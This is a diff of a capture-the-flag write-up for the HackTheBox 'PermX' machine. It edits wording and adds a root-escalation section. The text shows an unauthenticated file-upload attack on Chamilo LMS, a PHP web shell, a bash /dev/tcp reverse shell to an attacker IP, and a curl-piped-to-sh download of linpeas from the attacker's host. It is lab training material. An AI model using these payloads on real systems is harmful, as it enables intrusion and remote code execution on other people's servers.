@@ -135,7 +135,7 @@ Adding the new sub-domain names to our `/etc/hosts` file.
 
 ## Burpsuite
 
-You can configure your browser's proxy so the information goes through burpsuite. I do this because it makes it easier to track how the website reacts/behaves while I explore the functionalities.
+It's allowed to configure your browser's proxy so the information goes through burpsuite. I do this because it makes it easier to track how the website reacts/behaves while I explore the functionalities.
 
 By inspecting the header of the website, we can see it's using `chamilo 1` 
 
@@ -158,11 +158,11 @@ $ echo '<?php system($_GET["cmd"]); ?>' > rce.php
 $ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
 
-This is a web-shell `<?php system($_GET["cmd"]); ?>` which can achieve RCE by visiting the website with additional tags like this `view-source: http://<website>/rce.php?cmd=id`
+THe web-shell one-liner can achieve RCE by visiting the website and manipulate the page with parameters `view-source: http://<website>/rce.php?cmd=id`
 
 > I did a web-shell first and tried exploring the file with only that. And turns out the user `mtz`'s home directory is not readable to others.
 >
-> So I have to do a reverse shell to execute `linpeas` on it.
+> So I have to do a reverse shell to execute `linpeas` on it. (or not, maybe it's a skill issue)
 
 ## Reverse shell
 
@@ -170,29 +170,25 @@ Open up `vim` or `nano` and paste your payload, because `echo` does not like thi
 
 ```sh
 $ cat shell.php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/1234 0>&1'");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/1234 0>&1'");?>
 $ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
-```
-
-```
-The file has successfully been uploaded
 ```
 
 Start netcat listener on another terminal
 ```shell
-$ nc -lvnp 1234
+you@local$ nc -lvnp 1234
 ```
 And visit the php file we just uploaded
 
 ```shell
-$ curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php
+you@local$ curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php
 ```
 
 This will pop a shell on the terminal that's running netcat
 
 ```
 listening on [any] 1234 ...
-connect to [<local-ip>] from (UNKNOWN) [10.10.11.23] 41228
+connect to [<attacker-ip>] from (UNKNOWN) [10.10.11.23] 41228
 bash: cannot set terminal process group (1169): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$   
@@ -205,10 +201,13 @@ Then you can run `linpeas` on it
 ## Linpeas
 
 Obtaining `linpeas` from your local box by running `python3 -m http.server 5050` locally.
+```sh
+$ python3 -m http.server 5050
+```
 
 Running `linpeas` on the remote box.
 ```sh
-www-data@permx:/tmp/tmp.12345$ curl http://<local-ip>:5050/linpeas.sh | sh > linpeas.result
+www-data@permx:/tmp/tmp.12345$ curl http://<attacker-ip>:5050/linpeas.sh | sh > linpeas.result
 ```
 
 Reading `linpeas` output file with color
@@ -216,9 +215,20 @@ Reading `linpeas` output file with color
 $ less -r linpeas.result
 ```
 
-
 After some digging, 
 
+# Obtaining Root
+
+Check what command our user can execute with sudo privilege
+```sh
+mtz@permx$ sudo -l
+```
+
+> As silly as this is, you can get root shell by a simple `sudo /bin/bash -i` if you can execute `/bin/bash` with sudo (assuming root privilege).
+>
+> Just basic linux skill, a reminder to what the word hacker means: a person who's good at computer.
+> 
+> I'm a whacker.
 
 # After Root
 
@@ -231,3 +241,4 @@ I checked almost every entries that linpeas flagged, and I had these takeaway:
 - I did't believe I can somehow pop a `root` or `user` shell on the web-facing application under `/var/www`
 - This left us with credential stealing, which is ploughing through files named with `password` or `configuration`
 - Keep in mind `linpeas` checks within the file too, `cat`'ing individual flagged files isn't necessary
+
